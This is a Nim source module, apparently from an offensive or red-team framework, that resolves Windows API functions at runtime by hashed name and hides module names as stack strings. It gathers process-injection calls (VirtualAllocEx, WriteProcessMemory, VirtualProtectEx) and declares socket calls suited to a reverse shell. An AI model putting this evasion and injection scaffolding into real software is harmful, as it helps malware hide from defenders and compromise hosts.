import std/[macros]
import winim

import utils/[gpa, gmh, hash, stackstr]

type
  MODULES* {.pure.} = object
    advapi32*: HMODULE
    kernel32*: HMODULE
    ntdll*:    HMODULE
    user32*:   HMODULE
    ws2_32*:   HMODULE


  WIN32* {.pure.} = object
    # KERNEL32.DLL
    CloseHandle*:                 type(CloseHandle)
    CreateFileW*:                 type(CreateFileW)
    CreateProcessA*:              type(CreateProcessA)
    DuplicateHandle*:             type(DuplicateHandle)
    ExitProcess*:                 type(winbase.ExitProcess)
    GetComputerNameExA*:          type(GetComputerNameExA)
    GetCurrentDirectoryA*:        type(GetCurrentDirectoryA)
    GetCurrentProcess*:           type(GetCurrentProcess)
    GetModuleFileNameW*:          type(GetModuleFileNameW)
    GetModuleHandleA*:            type(winbase.GetModuleHandleA)
    GetProcessHandleCount*:       type(GetProcessHandleCount)
    GetLastError*:                type(GetLastError)
    GetProcAddress*:              type(winbase.GetProcAddress)
    GetProcessHeap*:              type(GetProcessHeap)
    GetStdHandle*:                type(GetStdHandle)
    HeapAlloc*:                   type(HeapAlloc)
    HeapFree*:                    type(HeapFree)
    LoadLibraryA*:                type(LoadLibraryA)
    LocalAlloc*:                  type(LocalAlloc)
    LocalFree*:                   type(winbase.LocalFree)
    OpenProcess*:                 type(OpenProcess)
    SetFileInformationByHandle*:  type(SetFileInformationByHandle)
    Sleep*:                       type(winbase.Sleep)
    WriteConsoleA*:               type(WriteConsoleA)
    VirtualAllocEx*:              type(VirtualAllocEx)
    VirtualProtectEx*:            type(VirtualProtectEx)
    WriteProcessMemory*:          type(WriteProcessMemory)

    # Advapi32.DLL
    GetUserNameA*:                type(GetUserNameA)

    # NTDLL
    NtQuerySystemInformation*:    type(NtQuerySystemInformation)

    # USER32.DLL
    MessageBoxA*:                 type(MessageBoxA)
    MessageBoxW*:                 type(MessageBoxW)
    wsprintfA*:                   type(winuser.wsprintfA)

    # ws2_32.dll
    WSASocketA*:                  type(WSASocketA)
    WSAStartup*:                  type(WSAStartup)
    inet_addr*:                   type(inet_addr)
    htons*:                       type(htons)
    connect*:                     type(connect)


  
  NIMLESS_INSTANCE* {.pure.} = object
    Module*: MODULES
    Win32*: WIN32
    IsInitialized*: bool

#[ Global Instance ]#
var ninst*: NIMLESS_INSTANCE

#[ Macro to initialize the function pointers ]#
proc makeCast(inst, modul, handl, class, fn: NimNode): NimNode =
  result = newNimNode(nnkCast)
  var 
    callExpr1 = newNimNode(nnkCall)
    callExpr2 = newNimNode(nnkCall)
  callExpr1.add(ident"type", newDotExpr(newDotExpr(inst, class), fn))
  callExpr2.add(ident"getProcAddressHash", 
                newDotExpr(newDotExpr(inst, modul), handl),
                newCall(
                  ident"static",
                  newCall(
                    ident"hashStrA",
                    newDotExpr(toStrLit(fn), ident"cstring")
                  )
                )
              )
  result.add(callExpr1)
  result.add(callExpr2)
  
  
macro getFuncPtr*(sect0, sect1): untyped =
  result = newStmtList()
  var 
    inst  = sect0[0][0]
    modul = sect0[0][1]
    handl = sect0[1]
    class = sect1[0][1]
    fn    = sect1[1]
    asgnNode = newNimNode(nnkAsgn)
    instExpr = newDotExpr(newDotExpr(inst, class), fn)
    castExpr = makeCast(inst, modul, handl, class, fn)
  asgnNode.add(instExpr)
  asgnNode.add(castExpr)
  result.add(asgnNode)


#[ Initialization Functions ]#
proc init*(ninst: var NIMLESS_INSTANCE): bool = 
  # Load Kernel32 Functions
  ninst.Module.kernel32 = gmh("kernel32")
  if ninst.Module.kernel32 != 0:
    # Do load library first incase of forwarded functions
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LoadLibraryA)

    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CloseHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CreateFileW)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.CreateProcessA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.DuplicateHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.ExitProcess)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetComputerNameExA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetCurrentDirectoryA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetCurrentProcess)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetModuleFileNameW)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetModuleHandleA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetProcAddress)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetProcessHandleCount)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetProcessHeap)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetLastError)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.GetStdHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.HeapAlloc)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.HeapFree)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LocalAlloc)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.LocalFree)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.OpenProcess)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.SetFileInformationByHandle)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.Sleep)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.WriteConsoleA)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.VirtualAllocEx)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.VirtualProtectEx)
    getFuncPtr(ninst.Module.kernel32, ninst.Win32.WriteProcessMemory)
  else: return false

  # Load NTDLL.DLL
  var ntdll {.stackStringA.} = "ntdll"
  ninst.Module.ntdll = ninst.Win32.LoadLibraryA(cast[cstring](ntdll[0].addr))
  if ninst.Module.ntdll != 0:
    getFuncPtr(ninst.Module.ntdll, ninst.Win32.NtQuerySystemInformation)
  else: return false


  # Load USER32.dll
  var user32 {.stackStringA.} = "user32.dll"
  ninst.Module.user32 = ninst.Win32.LoadLibraryA(cast[cstring](user32[0].addr))
  if ninst.Module.user32 != 0:
    getFuncPtr(ninst.Module.user32, ninst.Win32.MessageBoxA)
    getFuncPtr(ninst.Module.user32, ninst.Win32.MessageBoxW)
    getFuncPtr(ninst.Module.user32, ninst.Win32.wsprintfA)
  else: return false



  ninst.IsInitialized = true
  
  return true
